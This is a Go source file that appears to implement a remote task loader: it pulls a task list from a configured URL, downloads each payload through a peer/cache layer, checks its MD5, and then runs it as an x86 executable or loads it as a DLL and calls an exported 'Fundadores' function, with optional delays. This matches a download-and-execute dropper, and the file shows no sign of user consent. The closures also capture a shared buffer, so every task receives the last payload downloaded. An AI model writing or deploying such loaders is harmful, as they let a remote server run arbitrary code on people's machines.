package main

import (
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/ssoor/fundadore/api"
	"github.com/ssoor/fundadore/log"
	"github.com/ssoor/fundadore/common"
	"github.com/ssoor/fundadore/config"
	"github.com/ssoor/fundadore/assistant"
	"github.com/ssoor/fundadore/youniverse"
)

func getMD5(data []byte) string {
	md5Ctx := md5.New()
	md5Ctx.Write(data)
	cipherStr := md5Ctx.Sum(nil)

	return hex.EncodeToString(cipherStr)
}

func downloadResource(resourceKey string, checkHash string) ([]byte, error) {
	var data []byte

	if err := youniverse.Get(nil, resourceKey, &data); nil != err {
		return nil, err
	}

	dataHash := getMD5(data)
	if false == strings.EqualFold(checkHash, dataHash) {
		return nil, errors.New(fmt.Sprint("check ", resourceKey, " hash [", checkHash, "] failed, Unexpected hash [", dataHash, "]"))
	}

	return data, nil
}

func implementationResource(resourceBody []byte, resourcePath string, execParameter string) error {
	execInfo := config.ResourceExecInfo{}
	if err := json.Unmarshal([]byte(execParameter), &execInfo); err != nil {
		return err
	}

	if !strings.EqualFold(execInfo.PEType, "x86") {
		return errors.New("Unsupported PE type")
	}

	time.Sleep(time.Duration(execInfo.Delay) * time.Second)

	switch execInfo.FileType {
	case "res":
		return nil
	case "exe":
		exec_cmd := exec.Command(resourcePath, execInfo.Parameter)
		if err := exec_cmd.Start(); nil != err {
			return err
		}
	case "dll":
		library, err := syscall.LoadLibrary(resourcePath)
		if nil != err {
			return err
		}

		procFundadores, err := syscall.GetProcAddress(library, execInfo.PEEntry)
		if nil != err {
			return err
		}

		if 0 == procFundadores {
			return errors.New("function Fundadores not finded")
		}

		if ret, _, _ := syscall.Syscall(procFundadores, 1, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(execInfo.Parameter))), 0, 0); 0 == ret {
			return errors.New("Call dll function Fundadores failed")
		}
	case "memdll":
		library, err := syscall.LoadLibrary(resourcePath)
		if nil != err {
			return err
		}

		procFundadores, err := syscall.GetProcAddress(library, execInfo.PEEntry)
		if nil != err {
			return err
		}

		if 0 == procFundadores {
			return errors.New("function Fundadores not finded")
		}

		if ret, _, _ := syscall.Syscall(procFundadores, 1, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(execInfo.Parameter))), 0, 0); 0 == ret {
			return errors.New("Call dll function Fundadores failed")
		}
	}

	return nil
}

func getTasks(guid string, url string) ([]config.Task, error) {

	jsonTasks, err := api.GetURL(url)
	if err != nil {
		return []config.Task{}, err
	}

	tasks := []config.Task{}
	tasksOld := []config.TaskOld{}

	if err = json.Unmarshal([]byte(jsonTasks), &tasksOld); err == nil {
		for _, info := range tasksOld {
			
			switch info.Save.Type {
			case "runexe":
				info.Save.Type = "exe"
			case "loaddll":
				info.Save.Type = "dll"
			}

			resourceExecInfo := config.ResourceExecInfo{
				WorkPath:        "",
				FileType:        info.Save.Type,
				Parameter:       info.Save.Param,
				ContinueOnError: !info.Save.Must, // 取反

				Delay:      0,
				ShowMode:   0,
				PEType:     "x86",
				PEEntry:    "Fundadores",
				ModeServer: false,
			}

			newTask := config.Task{
				Name:     info.Name,
				Hash:     info.Hash,
				Exec:	  resourceExecInfo,
				SavePath: info.Save.Path,
			}

			tasks = append(tasks, newTask)
		}

		return tasks, nil
	}

	if err = json.Unmarshal([]byte(jsonTasks), &tasks); err != nil {
		return []config.Task{}, err
	}

	return tasks, nil
}

func StartFundadore(account string, guid string, setting config.Fundadore) (downSucc bool, err error) {
	downSucc = true
	curDir, _ := common.GetCurrentDirectory()
	log.Info("Fundadores download starting, current arch is", runtime.GOARCH, ", dir is", curDir)

	allTasks, err := getTasks(account, setting.TasksURL)
	if nil != err {
		downSucc = false
		return downSucc, err
	}

	var resBody []byte
	for _, task := range allTasks {
		task.SavePath = os.ExpandEnv(task.SavePath)

		if resBody, err = downloadResource(task.Name, task.Hash); nil != err { // 由于先判断的错误，这里 contiune 后下面代码就不会注册执行回调
			downSucc = false
			return downSucc, err
		}

		defer func(param1 config.Task) { // 执行函数
			if true == downSucc { // 如果下载没有失败的话, 启动
				go func(execTask config.Task) {
					var exec []byte
					var assistantErr error

					if exec, assistantErr = json.Marshal(execTask.Exec); err == nil {
						assistantErr = assistant.ImplementationResource(resBody, execTask.SavePath, string(exec));
					}

					log.Info("Fundadores implementation resource:", execTask.Name, ", error ", assistantErr, "\n\texec parameters is", string(exec))
				}(param1)
			}
		}(task)

		log.Info("Fundadores download resource", task.SavePath, task.Name, fmt.Sprintf("(%s)", task.Hash), ", stats is:", nil == err)

		if nil != err {
			log.Warning("\tDownload error:", err)
		}

	}

	log.Info("Youniverse stats info:")

	log.Info("\tGET : ", youniverse.Resource.Stats.Gets.String())
	log.Info("\tLOAD : ", youniverse.Resource.Stats.Loads.String(), "\tHIT  : ", youniverse.Resource.Stats.CacheHits.String())
	log.Info("\tPEER : ", youniverse.Resource.Stats.PeerLoads.String(), "\tERROR: ", youniverse.Resource.Stats.PeerErrors.String())
	log.Info("\tLOCAL: ", youniverse.Resource.Stats.LocalLoads.String(), "\tERROR: ", youniverse.Resource.Stats.LocalLoadErrs.String())

	downSucc = true
	return downSucc, err
}
